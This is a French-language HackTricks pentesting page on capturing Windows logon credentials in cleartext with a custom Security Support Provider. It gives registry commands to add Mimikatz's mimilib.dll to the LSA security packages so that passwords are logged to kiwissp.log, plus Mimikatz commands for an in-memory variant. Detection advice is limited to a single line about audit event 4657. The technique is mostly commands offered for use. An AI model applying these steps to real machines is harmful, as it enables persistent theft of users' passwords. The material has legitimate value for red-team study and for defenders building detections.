<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# SSP personnalisé

[Apprenez ce qu'est un SSP (Security Support Provider) ici.](../authentication-credentials-uac-and-efs.md#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capturer** en **clair** les **identifiants** utilisés pour accéder à la machine.

### Mimilib

Vous pouvez utiliser le binaire `mimilib.dll` fourni par Mimikatz. **Cela enregistrera dans un fichier tous les identifiants en clair.**\
Déposez le dll dans `C:\Windows\System32\`\
Obtenez une liste des packages de sécurité LSA existants :

{% code title="attaquant@cible" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Ajoutez `mimilib.dll` à la liste des fournisseurs de support de sécurité (Paquets de sécurité) :
```csharp
PS C:\> reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Et après un redémarrage, toutes les informations d'identification peuvent être trouvées en clair dans `C:\Windows\System32\kiwissp.log`

### En mémoire

Vous pouvez également injecter cela directement en mémoire en utilisant Mimikatz (notez que cela pourrait être un peu instable/ne pas fonctionner) :
```csharp
privilege::debug
misc::memssp
```
Cela ne survivra pas aux redémarrages.

## Atténuation

ID d'événement 4657 - Auditer la création/le changement de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`


<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
